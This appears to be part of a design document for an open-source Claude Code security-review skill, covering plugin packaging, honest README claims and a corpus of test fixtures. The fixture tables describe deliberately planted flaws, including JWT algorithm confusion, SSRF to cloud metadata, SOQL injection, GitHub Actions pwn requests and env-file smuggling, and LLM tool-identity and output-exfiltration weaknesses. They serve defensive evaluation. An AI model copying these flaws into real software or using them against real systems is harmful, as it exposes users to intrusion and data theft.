- Frontmatter booleans only reliably accept `true`/`false` before v2.1.218; if any lens tooling emits `yes`/`no`, normalize to `true`/`false`.

### Pitfalls to avoid

- **`skills/` inside `.claude-plugin/`.** The #1 documented failure: the plugin loads, zero skills appear. Only `plugin.json` and `marketplace.json` belong in `.claude-plugin/`. Everything else â€” `skills/`, `scripts/`, `fixtures/`, `.github/` â€” sits at the plugin root.
- **`skill.md` / `Skill.md` / `skills/last-aperture.md`.** The filename must be exactly `SKILL.md` inside a per-skill directory. Flat markdown under `skills/` is not discovered.
- **Malformed YAML frontmatter fails silently.** No error surfaces; the skill just never auto-invokes. Add `claude --debug` to the release checklist and `claude plugin validate ./ --strict` to CI.
- **Adding `"skills": ["./skills/"]` "for clarity."** It is redundant, triggers shadowing warnings, and if the path is ever wrong you get nothing.
- **Assuming other component keys behave like `skills`.** `commands`, `agents`, `workflows`, `outputStyles`, `experimental.themes`, `experimental.monitors` **replace** their default directory instead of adding to it. Not an issue today because none are declared â€” it becomes one the moment someone adds a `commands/` entry.
- **Wrong JSON *type* in plugin.json is a hard load error**, unlike an unrecognized field, which is only a warning. `"keywords": "security"` as a string instead of an array kills the plugin. CI must run `claude plugin validate ./ --strict`.
- **Absolute paths anywhere in either manifest.** All component paths must be relative and begin with `./`.
- **Setting `version` and then not bumping it.** Users receive no updates from new commits. Omit it during the restructure.
- **Telling users to add a raw `marketplace.json` URL.** Only that one file is fetched, so `"source": "./"` cannot resolve. The README must say `/plugin marketplace add GH-OWNER/last-aperture` (or `claude plugin marketplace add ...` for non-interactive use), never a raw file link.
- **Renaming the plugin after release without a `renames` entry.** If `last-aperture` is ever renamed, add `"renames": { "last-aperture": "<new-name>" }` to marketplace.json (v2.1.193+) so existing installs migrate instead of breaking.
- **`strict: false` plus components in plugin.json** â†’ "conflicting manifests" load failure. Leave `strict` at its default.
- **Blaming packaging for the project-scope trust gate.** A plugin checked into a teammate's repo loads only after the same trust prompt that governs `.claude/settings.json`, with extra restrictions on code-running components. "Works for me, not for my teammate" is usually that gate, not the manifest.
- **Expecting a bare `/last-aperture`.** The namespaced form `/last-aperture:last-aperture` is the guaranteed one; the bare form works only while no other command claims the name. Document the namespaced form in the README.

### Sources

Documentation (all verified during recon; the legacy `docs.claude.com/en/docs/claude-code/plugins-reference` URL now 301-redirects to the first entry):

- https://code.claude.com/docs/en/plugins-reference â€” canonical plugin.json schema, required-vs-optional field tables, component path add-vs-replace rules, directory-structure and file-location tables, troubleshooting table with literal error strings.
- https://code.claude.com/docs/en/skills â€” full SKILL.md frontmatter table, the 1,536-character `description` + `when_to_use` cap, skill-listing budget behavior, how a skill derives its command name.
- https://code.claude.com/docs/en/plugin-marketplaces â€” marketplace.json required/optional fields, `owner` sub-fields, plugin-entry fields, every `source` form, relative-path resolution, reserved names, strict mode, `/plugin marketplace add owner/repo`.
- https://code.claude.com/docs/en/plugins â€” plugin authoring walkthrough.
- https://code.claude.com/docs/en/discover-plugins â€” install-side commands.

Local manifest shapes actually inspected:

- `<CLAUDE_CONFIG>/plugins/cache/claude-plugins-official/superpowers/6.2.0/.claude-plugin/plugin.json` â€” 14 skills, no `skills` key; proof the default scan needs no declaration.
- `<CLAUDE_CONFIG>/plugins/cache/claude-plugins-official/superpowers/6.2.0/.claude-plugin/marketplace.json` â€” single-entry catalog, `"source": "./"`.
- `<CLAUDE_CONFIG>/plugins/marketplaces/superpowers-extended-cc-marketplace/.claude-plugin/{marketplace.json,plugin.json}` â€” a public GitHub repo shipping both files in `.claude-plugin/` with `"source": "./"`; the exact pattern adopted above.
- `<CLAUDE_CONFIG>/plugins/cache/claude-plugins-official/claude-md-management/1.0.0/.claude-plugin/plugin.json` plus `skills/claude-md-improver/{SKILL.md,references/}` and `commands/revise-claude-md.md` â€” minimal 4-field manifest; supporting `references/` inside a skill dir with no manifest entry.
- `<CLAUDE_CONFIG>/plugins/cache/claude-plugins-official/frontend-design/unknown/.claude-plugin/plugin.json` and `skills/frontend-design/SKILL.md` â€” one-skill plugin still nested under `skills/`; undocumented `license` frontmatter key loading harmlessly.
- `<CLAUDE_CONFIG>/plugins/cache/claude-plugins-official/superpowers/6.2.0/skills/{test-driven-development,using-superpowers}/SKILL.md` â€” real-world minimal frontmatter: `name` + `description` only.
- `<CLAUDE_CONFIG>/plugins/marketplaces/claude-plugins-official/.claude-plugin/marketplace.json` â€” Anthropic's own catalog; `$schema`, `renames`, `category`, and `git-subdir` sources with `ref`+`sha` pinning.
- The temporary recon dossier `scratchpad/recon/verify-plugin-schema.json` consolidated the evidence above.

## 8. README positioning

### What to claim

Every claim below is tied to a mechanism that exists in the design and is checkable by a reader who clones the repo. Where a claim needs a hedge, the hedge is part of the claim.

1. **MIT, forkable, and positioned in the gap Anthropic's license leaves.** This is the strongest and least arguable claim, so state it with license facts and zero adjectives: *"MIT licensed. Anthropic's `claude-security` plugin is the best-architected thing in this space; its license permits modification for internal use only and forbids redistribution, sublicensing, making it available to third parties, or using it to develop a non-Anthropic product. `anthropics/defending-code-reference-harness` is MIT but states it is not maintained and not accepting contributions. If you need to fork, vendor, audit, or add private lenses, that is what this is for."* Do not generalize past that sentence â€” `claude-code-security-review`, `code-audit`, `cybersecurity-skills`, and `security-skills-claude-code` are all MIT too.

2. **The lens registry and fixture corpus are the contribution; the orchestration is not.** Claim `lenses/_topics.md` with the single-owner invariant (every topic slug owned by exactly one lens, `defers` naming the owner, CI enforcing it), and the required per-lens `## Known false positives` and `## Proof recipes` sections. Nobody surveyed ships a topic-ownership registry or mandates a per-domain safe-but-suspicious section. Lead with this rather than with the fan-out â€” orchestration is commodity as of mid-2026 and Anthropic's is better.

3. **Vertical and compliance lenses as dispatchable auditors.** `salesforce` (CRUD/FLS enforcement, `without sharing`, SOQL injection, Named Credentials, Shield encryption on ePHI fields), `hipaa-and-phi` (with its own report-format override), and `cicd-and-supply-chain`. `briiirussell/cybersecurity-skills` is the only real competitor and has `hipaa-audit`/`pci-audit`/`privacy-engineering` but no Salesforce/Apex and no CI/CD, and its skills are sequential methodology documents rather than auditors dispatched against an owned slug set. Apex is the one place authorship is a defensible advantage rather than an assertion.

4. **A proof discipline with a severity consequence, and no container requirement.** Claim the contract, not the invention: *"Critical and High findings must ship a repo-local test that fails on the vulnerable code and passes after the patch. Three outcomes: fails pre-patch = confirmed; passes pre-patch = disproved and the finding is dropped; untestable = UNPROVEN and capped at Medium. Static-only (T0) and written-PoC (T3) findings are also capped at Medium."* Then concede in the same breath: no Docker, no ASAN, no gVisor, and no running target â€” which also means it is weaker than `defending-code`'s 3/3-crash-plus-independent-grader oracle and weaker than a working exploit from Strix. Also claim the ARVO/PoCGen refinement explicitly: the rest of the suite must still pass after the patch, or a fix that breaks functionality reads as a success. **If the pipeline does not yet assert full-suite pass, add it before claiming it.**

5. **Clean fixtures as a per-lens CI regression gate â€” described as a regression gate, not a benchmark.** Claim: clean fixtures are asserted to produce zero findings at Low or above, and a failure is treated as a regression; vulnerable-fixture detection is tracked as a separate capability number that is not expected to be 100%. Credit the precedent (OWASP Benchmark's safe cases, NIST Juliet/SARD, Semgrep's must-fire/must-not-fire rule tests) and the split (`adewale/skill-eval-harness`: mixing regression and capability evals produces wrong prioritization). Say in the README that because the agent is nondeterministic this gate is flaky, and state the flake policy â€” a security tool whose own CI is red half the time is worse than no CI claim.

6. **Coverage disclosure, not coverage.** The mandatory Coverage block in Phase 5 plus the Phase 6 completeness critic let you claim: *"the report states which lenses activated, which did not, and why."* That is a real, verifiable property and it is the honest substitute for the word "comprehensive."

7. **Bounded, stated rails.** Local repo and localhost only; never remote or production hosts; no destructive payloads; security tests confined to their own directory; never commits; never sources production credentials; T2 dynamic runs require asking the user every time. These are checkable in the text of SKILL.md, which makes them a claim rather than a promise.

8. **Cross-cutting lenses as a registry type** (`cross_cutting: true`, empty `activates_on`, `owns: []`) consuming the merged finding set in triage. Real and tidy, but a design note in the architecture section â€” not a headline. `3stoneBrother/code-audit` already does attack-chain construction in its report phase.

9. **Harness portability as a constraint, caveated.** Claim only the narrow part: SKILL.md's normative text names no harness-specific tool, lens files and schema are byte-identical across harnesses, and the sequential fallback is tested, so the only thing that changes without subagents is wall-clock time. `cybersecurity-skills` already ships generated Cursor and Codex adapters, so cross-harness support itself is not new.

### What NOT to claim

An explicit do-not-say list. The reason each one is indefensible is the point of the entry.

- **"Parallel domain fan-out with merge, dedup, and triage"** as the innovation. Anthropic's `claude-security` fans out one researcher per component Ã— category and runs a three-verifier adversarial panel whose lenses are literally REACHABILITY, IMPACT, DEFENSES, with a 2-of-3 quorum and confidence computed in Python so the tally is auditable. `3stoneBrother/code-audit` shipped five parallel domain agents with cross-agent dedup and attack chaining at 829 stars. This is table stakes.
- **"Requires proof of exploitability" as novel.** `defending-code-reference-harness` (MIT, 6.8k stars) already refuses findings without a PoC crashing 3/3 and independently re-reproduced. PoCGen and PoCo formalized the fails-before/passes-after oracle in the literature. Aardvark reproduces in a sandbox before reporting. Strix validates with live exploits.
- **"Lens" as coinage or brand.** `apoorvjain25/production-audit` ships "24 lenses," `GeiserX/claude-code-parallel-skills` markets "orthogonal lenses," `zantific/skill-security-review-lens` has it in the repo name. Use the word because it is clear.
- **Clean/negative fixtures as a new idea.** OWASP Benchmark's safe cases exist specifically to test whether a tool can tell a real vulnerability from code that merely looks suspicious. Decade-old, standardized, cited.
- **Any detection rate, precision, recall, or FP rate** without a named corpus, a run count, and a methodology file in the repo. Anthropic states its own scans are nondeterministic and two scans surface different findings; the independent AI-SAST review called the commercial tools "completely indeterministic" across runs. A single-run percentage is noise and is the first thing a knowledgeable reader will use to dismiss the project.
- **Results on your own fixtures as evidence of real-world performance.** You wrote the fixtures, the lenses, and the `Known false positives` sections tuned against them. That is training to the test. Say so, and say the corpus is not comparable to OWASP Benchmark or RealVuln numbers.
- **"Zero false positives," "no noise," "eliminates false positives."** At best a property of one test suite on some runs. Corgea measured ~50% FPs in independent testing; nothing here is better-instrumented than that.
- **"Replaces / alternative to" SAST, SCA, secret scanning, dependency scanning, or human review â€” and never "penetration test."** Anthropic disclaims exactly this for its own plugin. An agent reading source cannot enumerate its own false negatives, which also rules out "comprehensive," "complete," and "full coverage."
- **"Reachability analysis."** CodeQL and Corgea mean taint dataflow and call-graph tracing from entry points to sinks. An LLM judging attacker-reachability from code it read is a heuristic. Say "reachability triage" or "attacker-reachability reasoning," and never imply soundness.
- **"Safe against prompt injection" or "safe to run on untrusted code / untrusted PRs."** `claude-code-security-review` states it is not hardened against prompt injection and should only review trusted PRs; `claude-security` states it adds no isolation of its own. This design inherits both plus extra exposure from reading fixture files and any CI wiring, and there is public precedent for real damage (the 2026 Claude Code GitHub Action flaw allowing repo hijack from a single malicious issue). Be conservative about anything recommended for automatic CI.
- **"HIPAA compliant," "HIPAA certified," "HIPAA audit," "risk analysis," "demonstrates compliance."** The `hipaa-and-phi` lens surfaces candidate gaps mapped to Security Rule safeguards. Not a legal opinion, not a BAA review, not a substitute for the required risk analysis â€” and note that Salesforce is not HIPAA compliant by default regardless of what the code does. Same restraint for GDPR, CCPA, PCI DSS.
- **"First," "only," "only open-source," "novel."** Six MIT competitors named in the survey. The only precise license claim available is the narrow one in claim 1.
- **Autonomy, 0-days, "found N real vulnerabilities," implied CVEs.** If there are ever upstreamed fixes, link them by URL the way CodeMender cites its 72 patches. Until then, silence.
- **"Fast," "cheap," "lightweight."** Ten-plus lens auditors, a triage pass, and a proof phase that writes and runs tests is expensive in tokens and wall-clock, and token cost counts against the user's plan. Publish the cost shape and effort tiers instead of letting readers discover them.
- **Anything that lets "red team" imply offensive testing.** That namespace is occupied by tools that run live exploits (red-run, offensive-claude, RedteamAgent, Strix). One early line â€” "this reads code and runs local tests; it does not attack running systems" â€” is mandatory.
- **Omitting the comparison.** Not an overclaim but the most damaging failure available: a reader who finds `anthropics/claude-security` and `defending-code-reference-harness` after a README that never mentions them concludes you either did not look or hoped they would not.

### Honest comparison

Against SAST, this is the weaker tool on every axis SAST is built for. CodeQL does real taint dataflow and call-graph reachability from sources to sinks; Semgrep runs deterministically in seconds on every PR, has an enumerable rule inventory you can diff, and its Assistant's triage layer is a shipped, measured feature with ~96% agreement with human researchers and memories learned from human feedback. This skill is nondeterministic, slow, expensive, and cannot tell you what it missed. It is additive to SAST and should be described that way â€” it reasons about business logic, authorization intent, multi-step chains, and compliance posture, which are the classes rule engines structurally cannot express, and it does so on findings a rule engine already can't reach. Against the AI offerings, concede more: Anthropic's `claude-security` has a better verification story (three independent verifiers per finding, 2-of-3 quorum, confidence computed in code rather than asserted), better patch validation, and Anthropic's maintenance behind it; `defending-code-reference-harness` has a strictly stronger proof oracle (build + PoC no longer crashes + suite passes + a fresh hunt cannot rediscover it); Aardvark and Strix actually reproduce against a running target, which beats a unit test that fails on the vulnerable branch; Snyk's remediation is grounded in 35,000+ expert-written fixes. What remains genuinely ours is narrow and worth stating narrowly: MIT and forkable where Anthropic's best option is not redistributable, vertical and compliance lenses nobody covers as dispatchable auditors, a proof-and-severity contract that runs with nothing but a test runner, and a committed registry plus fixture corpus that other people can extend and measure against.

### Draft README opening

> **last-aperture** is a Claude Code skill that reviews a repository for security defects and proposes patches. Mechanically: a recon pass inventories the repo and activates a subset of thirteen *lens* files â€” self-contained domain briefs for web/API, mobile, LLM/AI, cloud/IaC, CI/CD and supply chain, cryptography, Salesforce/Apex, HIPAA/PHI, privacy, threat modeling, plus three cross-cutting lenses that run over the merged results. Each activated lens is handed verbatim to an independent auditor. Their findings are merged, deduplicated, put through reachability triage and a false-positive sweep, and then Critical and High findings must ship a repo-local test that fails on the vulnerable code and passes after the patch. A finding whose test passes *before* the patch is dropped as disproved; a finding that cannot be tested is labelled UNPROVEN and capped at Medium. The report always states which lenses ran and which did not. It reads code and runs tests against your local repo and localhost â€” it does not attack running systems, and it is not a penetration test.
>
> If you already know this space, your first question is why not use `anthropics/claude-security`, and the honest answer is that you probably should: it fans out per component and category, verifies every finding through three independent verifiers with a 2-of-3 quorum and confidence computed in code, and writes reviewed patches. Its license permits modification for internal use only and forbids redistribution, sublicensing, third-party availability, or use in developing a non-Anthropic product. `anthropics/defending-code-reference-harness` is MIT with a stronger proof gate, but it is C/C++ memory safety via ASAN, needs Docker and gVisor, and says it is unmaintained and not accepting contributions. `3stoneBrother/code-audit` and `briiirussell/cybersecurity-skills` already do parallel domain agents and broad domain coverage respectively, both MIT. This project exists for four specific reasons: it is MIT and forkable, so you can vendor it and add private lenses; it treats Salesforce/Apex, HIPAA/PHI, and CI/CD as dispatchable auditors rather than generic categories; the proof gate needs nothing but a working test runner; and the lens registry and fixture corpus are published as the extensible part. It is nondeterministic â€” two runs surface different findings â€” it does not replace SAST, SCA, dependency scanning, or human review, it is not hardened against prompt injection, it adds no isolation of its own, and it publishes no detection percentages. **Read [LIMITATIONS.md](LIMITATIONS.md) before you read the feature list.**

## 9. Fixture corpus proposal

Two design invariants make the corpus scorable, and both should be enforced by CI over `EXPECTED.md`:

1. **One bug class per vulnerable file.** No file carries a second, incidental defect. Any finding on a vulnerable file beyond the manifest entry (and beyond its `also_acceptable` list) counts against precision, so the eval yields a real FP rate rather than a vibe.
2. **Every clean file is self-contained.** "This is safe because the guard lives in another file" is not allowed â€” a reviewer holding only that one file must be able to reach *no finding*. This kills whole families of tempting-but-unscorable canaries (CSP set in a sibling middleware, consent gate in a different hook).

Each vulnerable fixture ships a reference T1 proof at `fixtures/tests/test_<id>_<slug>.<ext>` that **fails before the patch and passes after**. The harness uses it two ways: as the recall oracle, and to check that the auditor's claimed proof tier was actually achievable â€” an auditor reporting T3/UNPROVEN on a file where a repo-local failing test exists is itself a scored defect.

### fixtures/vulnerable/

| # | file | language | single bug class | severity | CWE | catching lens |
|---|---|---|---|---|---|---|
| 001 | `web_bola_fastapi.py` | Python (FastAPI + SQLAlchemy) | `GET /invoices/{id}` loads by primary key with no tenant predicate â€” cross-tenant object read | High | CWE-639 | web-and-api |
| 002 | `web_ssrf_redirect_chase.ts` | TypeScript (Express + undici) | Hostname allowlist validated on the first hop only; `redirect: follow` chases 302 â†’ `169.254.169.254` | High | CWE-918 | web-and-api |
| 003 | `web_graphql_alias_amplification.js` | JavaScript (Apollo Server 4) | Depth limit installed, no alias/complexity cap â€” same expensive field aliased 500Ã— executes | Medium | CWE-770 | web-and-api |
| 004 | `crypto_jwt_alg_from_header.go` | Go (golang-jwt/jwt v5) | Keyfunc branches on `token.Header["alg"]`, so RS256 verification accepts HS256 keyed on the PEM public key | Critical | CWE-347 | crypto-and-key-management |
| 005 | `crypto_gcm_static_nonce.py` | Python (`cryptography` AESGCM) | Module-level `NONCE = b"\x00" * 12` reused for every encryption | Critical | CWE-323 | crypto-and-key-management |
| 006 | `crypto_weak_pbkdf2.cs` | C# (`Rfc2898DeriveBytes`) | Password hashing at 1 000 iterations with the SHA-1 default | High | CWE-916 | crypto-and-key-management |
| 007 | `crypto_webhook_compare.php` | PHP | `hash_hmac(...) === $header` â€” non-constant-time signature comparison | Medium | CWE-208 | crypto-and-key-management |
| 008 | `sf_CaseIntakeController.cls` | Apex | `@AuraEnabled` takes a JSON blob, `JSON.deserialize(payload, Case.class)`, then DML â€” write-side FLS bypass sets `Is_Approved__c` | High | CWE-915 | salesforce-platform |
| 009 | `sf_ContactSearch.cls` | Apex | Search term concatenated into `Database.query` with no escaping or bind â€” tautology injection returns other owners' rows | High | CWE-943 | salesforce-platform |
| 010 | `llm_rag_retriever.py` | Python (LangChain + pgvector) | Similarity search runs with no tenant filter inside the vector query; foreign chunks reach the prompt | High | CWE-862 | llm-and-ai |
| 011 | `llm_tool_registry.ts` | TypeScript (Vercel AI SDK) | Tool schema exposes `user_id` for the model to fill; executor trusts it as identity â€” confused deputy | High | CWE-807 | llm-and-ai |
| 012 | `mobile_session_store.tsx` | TypeScript (React Native) | Session bearer token written to `AsyncStorage.setItem` | Medium | CWE-312 | mobile-app-security |
| 013 | `mobile_DeepLinkActivity.kt` | Kotlin (Android) | `myapp://open?url=` handed to `WebView.loadUrl` with no scheme/host allowlist | High | CWE-939 | mobile-app-security |
| 014 | `cloud_s3_public.tf` | Terraform HCL | Bucket policy with `Principal: "*"` and all four `aws_s3_bucket_public_access_block` flags `false` | High | CWE-732 | cloud-and-iac |
| 015 | `cloud_pod_privileged.yaml` | Kubernetes YAML | `privileged: true` plus `hostPath: /` mount â€” node escape primitive | Critical | CWE-250 | cloud-and-iac |
| 016 | `cicd_pwn_request.yml` | GitHub Actions YAML | `pull_request_target` checks out `github.event.pull_request.head.sha` and runs `npm ci` with `secrets` in scope | Critical | CWE-829 | cicd-and-supply-chain |
| 017 | `cicd_github_env_injection.yml` | GitHub Actions YAML | Issue title appended to `"$GITHUB_ENV"` with `echo`; a newline smuggles `NODE_OPTIONS` into the next step | High | CWE-78 | cicd-and-supply-chain |
| 018 | `hipaa_encounter_logging.py` | Python (Django + Sentry SDK) | `logger.info` of the full patient serializer; the same dict rides along as a Sentry breadcrumb | High | CWE-532 | hipaa-and-phi |
| 019 | `privacy_layout_gtm.tsx` | TypeScript (Next.js `app/layout.tsx`) | GTM container script rendered unconditionally, before any consent state is read | Medium | CWE-359 | privacy-and-data-protection |
| 020 | `tm_PolicyGate.java` | Java (Spring) | `catch (TimeoutException e) { return Decision.ALLOW; }` on the policy-service call â€” fail-open at a trust boundary | High | CWE-636 | threat-modeling |

Language spread: Python 4, TypeScript 4, YAML 3, Apex 2, and one each of JavaScript, Go, C#, PHP, Kotlin, Java, HCL. Severity spread is deliberate â€” 4 Critical / 11 High / 5 Medium â€” so the eval also measures severity *calibration*, not just detection. An auditor that reports 020 as Critical or 003 as High is failing the same manifest that catches a miss.

Three files are **ownership canaries**, present because the topic-slug invariant is the thing most likely to break in practice:

- **004** (JWT alg confusion) must be reported by the crypto lens only. `jwt-verification` is owned by `crypto-and-key-management`; `web-and-api` defers. Two findings on 004 = a `_topics.md` regression, not two bugs.
- **007** (webhook HMAC compare) likewise: `webhook-signature-verification` sits in crypto, not web-and-api, even though the code lives in a route handler.
- **018** (PHI in logs) must be reported by hipaa-and-phi, not privacy-and-compliance. Both lenses activate on the file; only one owns `sensitive-data-in-logs` for PHI, and `privacy-and-data-protection` defers to it.

### fixtures/clean/

Each of these trips a high-confidence grep or signal from the lens that activates on it, and each requires the reviewer to trace one hop before concluding "not a finding."

| # | file | language | why it is a good canary |
|---|---|---|---|
| C-001 | `clean/jwt_kid_static_jwks.py` | Python (PyJWT) | Reads `jwt.get_unverified_header(token)["kid"]` and uses it â€” which is the exact shape of the `kid`-injection and key-source-injection findings. But the kid is only a lookup key into a module-level dict of three PEMs committed in the file, an unknown kid raises before verification, there is no network fetch of any kind, and `algorithms=["RS256"]` plus `audience=` and `issuer=` are pinned at the `decode` call. Flagging requires ignoring that the key set is closed. |
| C-002 | `clean/crypto_util.go` | Go | Two decoys in one file matching the crypto path glob `**/*crypt*.go`: `md5.Sum` and a hash compared with `==`. The MD5 derives an in-process LRU cache key and an ETag from a static asset path â€” no secret, no authorization decision downstream â€” and the `==` compares that non-secret ETag. The file's actual secret-bearing path, three functions down, correctly uses `hmac.New(sha256.New, key)` with `hmac.Equal`. A reviewer must confirm which value flows where before flagging CWE-327 or CWE-208. |
| C-003 | `clean/reset_token.ts` | TypeScript | Contains `Math.random()` â€” the single strongest "predictable token" signal â€” used only for retry-backoff jitter on the mailer call. The reset token itself is `crypto.randomBytes(32).toString("base64url")`, and redemption compares with `timingSafeEqual` behind an explicit length check (so the patched-into-a-500 variant is also absent). Two RNGs in one file, one of which is fine to be weak. |
| C-004 | `clean/gh_pr_label_comment.yml` | GitHub Actions YAML | `on: pull_request_target` with a `secrets`-bearing job â€” for most auditors a reflex Critical. This workflow never checks out or executes PR-controlled content: it calls `gh pr comment` and `gh api` against `github.event.pull_request.number`, every untrusted value is passed through `env:` and referenced as `"$VAR"`, and there is no `actions/checkout` step at all. The absence of the checkout is the whole finding-or-not, and it is easy to skim past. |
| C-005 | `clean/ReportColumnQuery.cls` | Apex | String concatenation directly into `Database.queryWithBinds` â€” visually identical to fixture 009. The concatenated token is a *field name*, resolved through `Schema.getGlobalDescribe().get('Account').getDescribe().fields.getMap()` and rejected if absent, and every value is bound. This is the case that separates "concatenation is injection" pattern-matching from understanding that `ORDER BY`/field position cannot be bound and an allowlist is the correct fix. |
| C-006 | `clean/android/app/src/debug/AndroidManifest.xml` | XML | `android:usesCleartextTraffic="true"` and a `<debug-overrides>` trust anchor â€” both real Critical-adjacent signals, both in the `src/debug/` source set, which never merges into the release manifest. The mobile lens's own proof recipe insists on testing the *merged release* manifest for exactly this reason. The trickiness is entirely in the path, which is the failure mode of any grep-driven auditor. |
| C-007 | `clean/network_public_alb.tf` | Terraform HCL | Two decoys. `cidr_blocks = ["0.0.0.0/0"]` appears on an ALB security group, but scoped to `from_port = 443, to_port = 443`; the SSH rule beside it uses `security_groups = [aws_security_group.bastion.id]` rather than a CIDR, so a grep for `0.0.0.0/0` lands next to port 22 in the same resource block. Second decoy: an `aws_db_instance` whose `db_subnet_group_name` references public subnets while `publicly_accessible = false` â€” not internet-reachable, though it reads as the textbook exposed-database finding. |
| C-008 | `clean/IconMessage.tsx` | TSX (React) | `dangerouslySetInnerHTML` applied to a value derived from **model output** â€” the LLM05 render-channel finding, with the highest-signal sink in the ecosystem. The model-supplied string is an icon *name*, looked up in a frozen `Record<string, string>` of inline SVG literals declared above it, with `""` returned for any unknown name. No attacker-controlled substring can reach the sink. Deliberately not the DOMPurify variant â€” see below. |

### EXPECTED.md format

```markdown
# EXPECTED.md â€” fixture manifest

manifest_version: 1
slug_registry: ../lenses/_topics.md
scoring:
  vulnerable: recall (manifest entry must be matched) + precision (unlisted findings are FPs)
  clean:      precision only; any finding at Low or above is an FP
  fp_budget:  0 findings >= Low across all of clean/

## vulnerable/web_bola_fastapi.py

â€‹```yaml
id: VULN-001
language: python
stack: fastapi + sqlalchemy
lens: web-and-api
topic: bola-idor
bug_class: >
  GET /invoices/{invoice_id} loads by primary key with no tenant predicate,
  so a user in org B reads org A's invoice.
cwe: CWE-639
severity: high
severity_if_t0_only: medium        # static-only proof caps here; not a miss
line_hint: 41
proof:
  tier: T1
  test: fixtures/tests/test_vuln_001_bola.py::test_org_b_cannot_read_org_a_invoice
  pre_patch: fail
  post_patch: pass
expect_findings: 1
also_acceptable: []
must_not_report:
  - jwt-verification               # the token helper at line 12 is correct
  - rate-limiting                  # deliberately out of scope for this file
```

## vulnerable/crypto_jwt_alg_from_header.go

â€‹```yaml
id: VULN-004
language: go
stack: golang-jwt/jwt v5
lens: crypto-and-key-management
topic: jwt-verification
bug_class: >
  Keyfunc selects the verification key from token.Header["alg"], so a token
  signed HS256 with the PEM bytes of the RSA public key verifies as admin.
cwe: CWE-347
severity: critical
severity_if_t0_only: medium
line_hint: 58
proof:
  tier: T1
  test: fixtures/tests/vuln_004_jwt_test.go::TestHS256ForgedWithPublicKeyIsRejected
  pre_patch: fail
  post_patch: pass
expect_findings: 1
ownership_canary: true             # web-and-api activates on this file and MUST defer
must_not_report:
  - api-authentication             # same defect, wrong owner -> _topics.md regression
```

## clean/gh_pr_label_comment.yml

â€‹```yaml
id: CLEAN-004
language: github-actions-yaml
lenses_expected_to_activate: [cicd-and-supply-chain]
expect_findings: 0                 # at Low or above; Info-level notes are unscored
self_contained: true
decoys:
  - "on: pull_request_target"
  - "job has secrets.GITHUB_TOKEN with issues: write"
  - "github.event.pull_request.head.sha referenced inside a run: step"
why_clean: >
  The privileged job never checks out or executes PR-controlled content â€” there is
  no actions/checkout step. Every untrusted value is bound into env: and referenced
  as "$VAR", so no PR-controlled string is ever expanded into shell text.
flagging_this_is: false-positive
expected_fp_topics:                # the topics an auditor is most likely to wrongly emit
  - privileged-trigger-code-execution
  - workflow-expression-injection
```
```

### Canaries I considered and rejected

Each of these looked like a clean-fixture candidate until I worked out that an auditor flagging it would be **right**, which makes it a vulnerable fixture or a judgement call â€” not a canary.

- **`__DEV__`- or `kDebugMode`-guarded trust-all TLS** (`badCertificateCallback => true`, `HostnameVerifier { true }`). The code still ships in the release binary unless the bundler provably eliminates it, and the guard is one flipped constant from live. Low-to-Medium is a correct call, so this is a *vulnerable* fixture at best.
- **`pull_request_target` with `actions/checkout` pinned to `github.base_ref`.** Trusted content today, one `ref:` edit from a Critical, and a merge-commit checkout reintroduces PR files. Reviewers who flag this pattern on sight are usually right; it does not belong in `clean/`.
- **Apex `without sharing` on a class currently invoked only from a scheduled job.** Nothing in the repo prevents an `@AuraEnabled` caller landing next sprint, and no in-file evidence establishes the caller set. Flagging as Low with "add `with sharing` or move the elevation to a narrow inner class" is correct.
- **`String.escapeSingleQuotes` on a `LIKE` clause value.** Genuinely injectable â€” escaping quotes does not escape `%` or `_`, so the attacker widens the match and over-discloses. This is a vulnerable fixture, and 009's sibling.
- **Read-only `hostPath` mount of `/var/run/docker.sock`.** `readOnly: true` on the mount is irrelevant; the Docker API over that socket is read-write and grants node root. Correctly Critical.
- **Tool schema exposing `tenant_id` that the executor overwrites server-side.** The overwrite may be correct today, but the schema advertises an identity-shaped parameter to the model, and the llm lens's own reflective guard is designed to fail on exactly that. Flagging at Low is defensible, so it cannot be a zero-finding fixture.
- **`WITH SECURITY_ENFORCED` on a query with a relationship subquery.** It does not enforce FLS on nested subquery fields. Looks like the recommended fix; is not one.
- **Security group with `0.0.0.0/0` egress on all ports and protocols.** Common practice, but it materially eases exfiltration and a Low finding is defensible â€” and clean fixtures must yield *zero* at Low or above.
- **`dangerouslySetInnerHTML` fed `DOMPurify.sanitize(modelOutput)` with default config.** Default config permits `<img src>` and `<a href>`, which leaves the LLM05 exfiltration channel wide open even though no script executes. This is why C-008 uses a frozen SVG lookup map instead of a sanitizer.
- **`verify=False` in a helper that lives under `tests/` but is exported from a shared package.** Importable from production code, so the "test-only" defence is unprovable from the file. Ambiguous, therefore excluded from both directories.

One case was cut for weakness rather than correctness: a hardcoded Firebase `apiKey` / Stripe publishable key in a mobile bundle is a true false positive, but the mobile lens already names it explicitly in its known-false-positives section, so a canary built on it tests documentation recall rather than reasoning. If it is added later, it should go in as a low-weight fixture and not count toward the FP budget.

## 10. Risks and open questions

Nine of the ten existing references are explicitly rated not publication-ready by recon, and the tenth has two release blockers, so "restructure into lenses" and "correct the content" are the same pass â€” budget them together, not sequentially. Readiness at a glance, with the extra-time flag:

- **mobile** â€” heaviest: eight technical errors, an internal severity self-contradiction (cert pinning Medium in checklist vs Low in table), three whole sections (M2/M6/M10) owned by other lenses, a Flutter activation claim with zero Flutter content, and private-product residue ("[consumer-app feature name redacted]", "[consumer-app feature name redacted]", "[consumer-app feature name redacted]").
- **hipaa-and-phi** â€” heavy: five confident legal overreaches that each generate wrong findings, plus named-vendor BAA verdicts and a Microsoft Teams section that are visible residue of the file's private origin.
- **salesforce** â€” heavy: six API/platform facts wrong (`WITH USER_MODE` version and DML applicability, `System.runAs()` outside tests, record-triggered Flow context), no false-positive discipline behind three "flag as High" instructions, an unbacked Visualforce promise, and silence on Experience Cloud guest-user access.
- **cloud-and-iac** â€” heavy: eight errors including two that invert AWS authorization semantics, plus a dozen stale platform facts and no volume control.
- **cicd-and-supply-chain** â€” heavy: nine correctable errors, an incident/tooling base frozen at 2023, and missing `$GITHUB_ENV`/`$GITHUB_OUTPUT` injection, `workflow_run`/`issue_comment` triggers, and cache poisoning.
- **web-and-api** â€” moderate but net-new writing: it is not yet a lens at all, because injection/XSS is delegated to SKILL.md; two cross-references are stale from 2021 numbering.
- **privacy-and-compliance** â€” moderate: the consent spine is misattributed (ePrivacy Art 5(3), not GDPR), the SAR deadline and SAQ A-EP characterisation are wrong, and PCI/COPPA/transfers content is behind.
